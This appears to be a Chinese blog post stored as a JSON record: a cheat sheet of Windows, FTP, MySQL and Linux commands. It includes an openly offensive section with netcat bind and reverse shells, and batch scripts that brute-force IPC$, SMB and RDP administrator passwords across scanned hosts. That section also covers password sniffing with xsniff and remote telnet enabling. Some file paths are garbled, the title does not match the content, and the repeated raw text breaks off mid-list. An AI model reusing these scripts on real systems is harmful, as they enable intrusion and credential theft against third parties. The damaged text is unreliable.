dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间\n\n　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间\n\n　　set 指定环境变量名称=要指派给变量的字符 设置环境变量\n\n　　set 显示当前所有的环境变量\n\n　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量\n\n　　pause 暂停批处理程序，并显示出：请按任意键继续....\n\n　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）\n\n　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）\n\n　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）\n\n　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）\n\n　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置\n\n　　echo 信息 在屏幕上显示出信息\n\n　　echo 信息 >> pass.txt 将\"信息\"保存到pass.txt文件中\n\n　　findstr \"Hello\" aa.txt 在aa.txt文件中寻找字符串hello\n\n　　find 文件名 查找某文件\n\n　　title 标题名字 更改CMD窗口标题名字\n\n　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白\n\n　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )\n\n　　ver 在DOS窗口下显示版本信息\n\n　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）\n\n　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS\n\n　　md　目录名 创建目录\n\n　　replace 源文件　要替换文件的目录 替换文件\n\n　　ren 原文件名　新文件名 重命名文件名\n\n　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称\n\n　　type 文件名 显示文本文件的内容\n\n　　more 文件名 逐屏显示输出文件\n\n　　doskey 要锁定的命令=字符\n\n　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=\n\n　　taskmgr 调出任务管理器\n\n　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误\n\n　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口\n\n　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe\n\n　　path 路径可执行文件的文件名 为可执行文件设置一个路径。\n\n　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?\n\n　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；\n\n　　regedit /e 注册表文件名 导出注册表\n\n　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。\n\n　　cacls 文件名 查看文件的访问用户权限列表\n\n　　REM 文本内容 在批处理文件中添加注解\n\n　　netsh 查看或更改本地网络配置情况\n\n　　IIS服务命令\n\n　　iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）\n\n　　iisreset /start或stop 启动（停止）所有Internet服务\n\n　　iisreset /restart 停止然后重新启动所有Internet服务\n\n　　iisreset /status 显示所有Internet服务状态\n\n　　iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动\n\n　　iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机\n\n　　iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务\n\n　　iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。\n\n　　FTP 命令： (后面有详细说明内容)\n\n　　ftp的命令行格式为:\n\n　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。\n\n　　－d 使用调试方式。\n\n　　－n 限制ftp的自动登录,即不使用.netrc文件。\n\n　　－g 取消全局文件名。\n\n　　help [命令] 或 ？[命令] 查看命令说明\n\n　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.\n\n　　pwd 列出当前远端主机目录\n\n　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中\n\n　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中\n\n　　mget [remote-files] 从远端主机接收一批文件至本地主机\n\n　　mput local-files 将本地主机中一批文件传送至远端主机\n\n　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件\n\n　　ascii 设定以ASCII方式传送文件(缺省值)\n\n　　bin 或 image 设定以二进制方式传送文件\n\n　　bell 每完成一次文件传送,报警提示\n\n　　cdup 返回上一级目录\n\n　　close 中断与远程服务器的ftp会话(与open对应)\n\n　　open host[port] 建立指定ftp服务器连接,可指定连接端口\n\n　　delete 删除远端主机中的文件\n\n　　mdelete [remote-files] 删除一批文件\n\n　　mkdir directory-name 在远端主机中建立目录\n\n　　rename [from] [to] 改变远端主机中的文件名\n\n　　rmdir directory-name 删除远端主机中的目录\n\n　　status 显示当前FTP的状态\n\n　　system 显示远端主机系统类型\n\n　　user user-name [password] [account] 重新以别的用户名登录远端主机\n\n　　open host [port] 重新建立一个新的连接\n\n　　prompt 交互提示模式\n\n　　macdef 定义宏命令\n\n　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录\n\n　　chmod 改变远端主机的文件权限\n\n　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母\n\n　　cd remote－dir 进入远程主机目录\n\n　　cdup 进入远程主机目录的父目录\n\n　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip\n\n　　#5\n\n　　MYSQL 命令\n\n　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。\n\n　　（例：mysql -h110.110.110.110 -Uroot -P123456\n\n　　注:u与root可以不用加空格，其它也一样）\n\n　　exit 退出MYSQL\n\n　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码\n\n　　grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）\n\n　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。\n\n　　use mysql；\n\n　　show tables; 显示库中的数据表\n\n　　describe 表名; 显示数据表的结构\n\n　　create database 库名; 建库\n\n　　use 库名；\n\n　　create table 表名 (字段设定列表)； 建表\n\n　　drop database 库名;\n\n　　drop table 表名； 删库和删表\n\n　　delete from 表名; 将表中记录清空\n\n　　select * from 表名; 显示表中的记录\n\n　　mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。\n\n　　win2003系统下新增命令（实用部份）：\n\n　　shutdown /参数 关闭或重启本地或远程主机。\n\n　　参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。\n\n　　例：shutdown /r /t 0 立即重启本地主机（无延时）\n\n　　taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。\n\n　　参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。\n\n　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。\n\n　　参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。\n\n　　Linux系统下基本命令　注：要区分大小写\n\n　　uname 显示版本信息（同win2K的 ver）\n\n　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）\n\n　　pwd 查询当前所在的目录位置\n\n　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。\n\n　　cat 文件名 查看文件内容\n\n　　cat >abc.txt 往abc.txt文件中写上内容。\n\n　　more 文件名 以一页一页的方式显示一个文本文件。\n\n　　cp 复制文件\n\n　　mv 移动文件\n\n　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录\n\n　　mkdir 目录名 建立目录\n\n　　rmdir 删除子目录，目录内没有文档。\n\n　　chmod 设定档案或目录的存取权限\n\n　　grep 在档案中查找字符串\n\n　　diff 档案文件比较\n\n　　find 档案搜寻\n\n　　date 现在的日期、时间\n\n　　who 查询目前和你使用同一台机器的人以及Login时间地点\n\n　　w 查询目前上机者的详细资料\n\n　　whoami 查看自己的帐号名称\n\n　　groups 查看某人的Group\n\n　　passwd 更改密码\n\n　　history 查看自己下过的命令\n\n　　ps 显示进程状态\n\n　　kill 停止某进程\n\n　　gcc 黑客通常用它来编译C语言写的文件\n\n　　su 权限转换为指定使用者\n\n　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。\n\n　　ftp ftp连接上某服务器（同win2K）\n\n　　批处理命令与变量\n\n　　1：for命令及变量 基本格式\n\n　　FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。\n\n　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3\n\n　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个\"1\"指起始值，第二个\"1\"指增长量，第三个\"254\"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }\n\n　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开\n\n　　command_parameters：为特定命令指定参数或命令行开关\n\n　　IN (set)：指在(set)中取值；DO command ：指执行command\n\n　　参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。\n\n　　用法举例：\n\n　　@echo off\n\n　　echo 用法格式：test.bat *.*.* > test.txt\n\n　　for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:administrator | find \"命令成功完成\" >>test.txt\n\n　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。\n\n　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有\"命令成功完成\"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。\n\n　　@echo off\n\n　　echo 用法格式：ok.bat ip\n\n　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200\n\n　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。\n\n　　七：\n\n　　2：if命令及变量 基本格式\n\n　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。\n\n　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。\n\n　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。\n\n　　IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。\n\n　　例：“if \"%2%\"==\"4\" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加\" \"）\n\n　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。\n\n　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到\":end\"标签处。\n\n　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”\n\n　　系统外部命令\n\n　　注：系统外部命令(均需下载相关工具)\n\n　　瑞士军刀：nc.exe\n\n　　参数说明：\n\n　　-h 查看帮助信息\n\n　　-d 后台模式\n\n　　-e prog程序重定向，一但连接就执行[危险]\n\n　　-i secs延时的间隔\n\n　　-l 监听模式，用于入站连接\n\n　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C\n\n　　-n IP地址，不能用域名\n\n　　-o film记录16进制的传输\n\n　　-p[空格]端口 本地端口号\n\n　　-r 随机本地及远程端口\n\n　　-t 使用Telnet交互方式\n\n　　-u UDP模式\n\n　　-v 详细输出，用-vv将更详细\n\n　　-w数字 timeout延时间隔\n\n　　-z 将输入，输出关掉（用于扫锚时）\n\n　　基本用法：\n\n　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口\n\n　　nc -l -p 80 开启本机的TCP 80端口并监听\n\n　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口\n\n　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口\n\n　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口\n\n　　高级用法：\n\n　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止\n\n　　nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt\n\n　　nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用\n\n　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用\n\n　　本机上用：nc -l -p 本机端口\n\n　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K\n\n　　nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙\n\n　　本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称\n\n　　在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机\n\n　　备 注：\n\n　　| 管道命令\n\n　　< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令\n\n　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中\n\n　　>与>>的区别 \">\"指：覆盖；\">>\"指：保存到(添加到）。\n\n　　如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。\n\n　　八：\n\n　　扫描工具：xscan.exe\n\n　　基本格式\n\n　　xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚\"起始IP到终止IP\"段的所有主机信息\n\n　　xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚\"主机IP列表文件名\"中的所有主机信息\n\n　　检测项目\n\n　　-active 检测主机是否存活\n\n　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）\n\n　　-port 检测常用服务的端口状态\n\n　　-ftp 检测FTP弱口令\n\n　　-pub 检测FTP服务匿名用户写权限\n\n　　-pop3 检测POP3-Server弱口令\n\n　　-smtp 检测SMTP-Server漏洞\n\n　　-sql 检测SQL-Server弱口令\n\n　　-smb 检测NT-Server弱口令\n\n　　-iis 检测IIS编码/解码漏洞\n\n　　-cgi 检测CGI漏洞\n\n　　-nasl 加载Nessus攻击脚本\n\n　　-all 检测以上所有项目\n\n　　其它选项\n\n　　-i 适配器编号 设置网络适配器, <适配器编号>可通过\"-l\"参数获取\n\n　　-l 显示所有网络适配器\n\n　　-v 显示详细扫描进度\n\n　　-p 跳过没有响应的主机\n\n　　-o 跳过没有检测到开放端口的主机\n\n　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10\n\n　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)\n\n　　用法示例\n\n　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机\n\n　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机\n\n　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机\n\n　　九：\n\n　　命令行方式嗅探器: xsniff.exe\n\n　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码\n\n　　参数说明\n\n　　-tcp 输出TCP数据报\n\n　　-udp 输出UDP数据报\n\n　　-icmp 输出ICMP数据报\n\n　　-pass 过滤密码信息\n\n　　-hide 后台运行\n\n　　-host 解析主机名\n\n　　-addr IP地址 过滤IP地址\n\n　　-port 端口 过滤端口\n\n　　-log 文件名 将输出保存到文件\n\n　　-asc 以ASCII形式输出\n\n　　-hex 以16进制形式输出\n\n　　用法示例\n\n　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中\n\n　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出\n\n　　终端服务密码破解: tscrack.exe\n\n　　参数说明\n\n　　-h 显示使用帮助\n\n　　-v 显示版本信息\n\n　　-s 在屏幕上打出解密能力\n\n　　-b 密码错误时发出的声音\n\n　　-t 同是发出多个连接（多线程）\n\n　　-N Prevent System Log entries on targeted server\n\n　　-U 卸载移除tscrack组件\n\n　　-f 使用－f后面的密码\n\n　　-F 间隔时间（频率）\n\n　　-l 使用－l后面的用户名\n\n　　-w 使用－w后面的密码字典\n\n　　-p 使用－p后面的密码\n\n　　-D 登录主页面\n\n　　用法示例\n\n　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码\n\n　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户\n\n　　@if not exist ipcscan.txt goto noscan\n\n　　@for /f \"tokens=1 delims= \" %%i in (3389.txt) do call hack.bat %%i\n\n　　nscan\n\n　　@echo 3389.txt no find or scan faild\n\n　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)\n\n　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat\n\n　　@if not exist tscrack.exe goto noscan\n\n　　@tscrack %1 -l administrator -w pass.dic >>rouji.txt\n\n　　:noscan\n\n　　@echo tscrack.exe no find or scan faild\n\n　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)\n\n　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。\n\n　　其它\n\n　　Shutdown.exe\n\n　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）\n\n　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）\n\n　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息\n\n　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。\n\n　　OpenTelnet.exe (远程开启telnet工具)\n\n　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。\n\n　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。\n\n　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)\n\n　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。\n\n　　FTP命令详解\n\n　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。\n\n　　FTP的命令行格式为：\n\n　　ftp -v -d -i -n -g [主机名] ，其中\n\n　　-v 显示远程服务器的所有响应信息\n\n　　-n 限制ftp的自动登录，即不使用；.n etrc文件；\n\n　　-d 使用调试方式；\n\n　　-g 取消全局文件名。\n\n　　FTP使用的内部命令如下(中括号表示可选项):\n\n　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip\n\n　　2.$ macro-ame[args]： 执行宏定义macro-name。\n\n　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。\n\n　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。\n\n　　5.ascii：使用ascii类型传输方式。\n\n　　6.bell：每个命令执行完毕后计算机响铃一次。\n\n　　7.bin：使用二进制文件传输方式。\n\n　　8.bye：退出ftp会话过程。\n\n　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。\n\n　　10. cd remote-dir：进入远程主机目录。\n\n　　11.cdup：进入远程主机目录的父目录。\n\n　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。\n\n　　13.close：中断与远程服务器的ftp会话(与open对应)。\n\n　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。\n\n　　15.delete remote-file：删除远程主机文件。\n\n　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。\n\n　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。\n\n　　18.disconnection：同close。\n\n　　19.form format：将文件传输方式设置为format，缺省为file方式。\n\n　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。\n\n　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。\n\n　　22.hash：每传输1024字节，显示一个hash符号(#)。\n\n　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。\n\n　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。\n\n　　25.image：设置二进制传输方式(同binary)。\n\n　　26.lcd[dir]：将本地工作目录切换至dir。\n\n　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。\n\n　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。\n\n　　29.mdelete[remote-file]：删除远程主机文件。\n\n　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。\n\n　　31.mget remote-files：传输多个远程文件。\n\n　　32.mkdir dir-name：在远程主机中建一目录。\n\n　　33.mls remote-file local-file：同nlist，但可指定多个文件名。\n\n　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。\n\n　　35.modtime file-name：显示远程主机文件的最后修改时间。\n\n　　36.mput local-file：将多个文件传输至远程主机。\n\n　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。\n\n　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。\n\n　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。\n\n　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。\n\n　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。\n\n　　42.passive：进入被动传输方式。\n\n　　43.prompt：设置多个文件传输时的交互提示。\n\n　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。\n\n　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。\n\n　　46.pwd：显示远程主机的当前工作目录。\n\n　　47.quit：同bye，退出ftp会话。\n\n　　48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.\n\n　　49.recv remote-file[local-file]：同get。\n\n　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。\n\n　　51.rhelp[cmd-name]：请求获得远程主机的帮助。\n\n　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。\n\n　　53.rename[from][to]：更改远程主机文件名。\n\n　　54.reset：清除回答队列。\n\n　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。\n\n　　56.rmdir dir-name：删除远程主机目录。\n\n　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。\n\n　　58.send local-file[remote-file]：同put。\n\n　　59.sendport：设置PORT命令的使用。\n\n　　60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。\n\n　　61.size file-name：显示远程主机文件大小，如：site idle 7200。\n\n　　62.status：显示当前ftp状态。\n\n　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。\n\n　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。\n\n　　65.system：显示远程主机的操作系统类型。\n\n　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。\n\n　　67.tick：设置传输时的字节计数器。\n\n　　68.trace：设置包跟踪。\n\n　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。\n\n　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3\n\n　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。\n\n　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.\n\n　　73.?[cmd]：同help.","source":"_posts/Tools/Windows命令.md","raw":"---\ntitle: MD 格式\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags:\n- tool\n---\n\n运行操作\n\nCMD命令：开始－>运行－>键入cmd或command(在命令行里可以看到系统版本、文件系统版本)\n\nCMD命令锦集\n\n1. gpedit.msc-----组策略\n\n　　2. sndrec32-------录音机\n\n　　3. Nslookup-------IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。\n\n　　4. explorer-------打开资源管理器\n\n　　5. logoff---------注销命令\n\n　　6. shutdown-------60秒倒计时关机命令\n\n　　7. lusrmgr.msc----本机用户和组\n\n　　8. services.msc---本地服务设置\n\n　　9. oobe/msoobe /a----检查XP是否激活\n\n　　10. notepad--------打开记事本\n\n　　11. cleanmgr-------垃圾整理\n\n　　12. net start messenger----开始信使服务\n\n　　13. compmgmt.msc---计算机管理\n\n　　14. net stop messenger-----停止信使服务\n\n　　15. conf-----------启动netmeeting\n\n　　16. dvdplay--------DVD播放器\n\n　　17. charmap--------启动字符映射表\n\n　　18. diskmgmt.msc---磁盘管理实用程序\n\n　　19. calc-----------启动计算器\n\n　　20. dfrg.msc-------磁盘碎片整理程序\n\n　　21. chkdsk.exe-----Chkdsk磁盘检查\n\n　　22. devmgmt.msc--- 设备管理器\n\n　　23. regsvr32 /u *.dll----停止dll文件运行\n\n　　24. drwtsn32------ 系统医生\n\n　　25. rononce -p----15秒关机\n\n　　26. dxdiag---------检查DirectX信息\n\n　　27. regedt32-------注册表编辑器\n\n　　28. Msconfig.exe---系统配置实用程序\n\n　　29. rsop.msc-------组策略结果集\n\n　　30. mem.exe--------显示内存使用情况\n\n　　31. regedit.exe----注册表\n\n　　32. winchat--------XP自带局域网聊天\n\n　　33. progman--------程序管理器\n\n　　34. winmsd---------系统信息\n\n　　35. perfmon.msc----计算机性能监测程序\n\n　　36. winver---------检查Windows版本\n\n　　37. sfc /scannow-----扫描错误并复原\n\n　　38. taskmgr-----任务管理器（2000/xp/2003\n\n　　40. 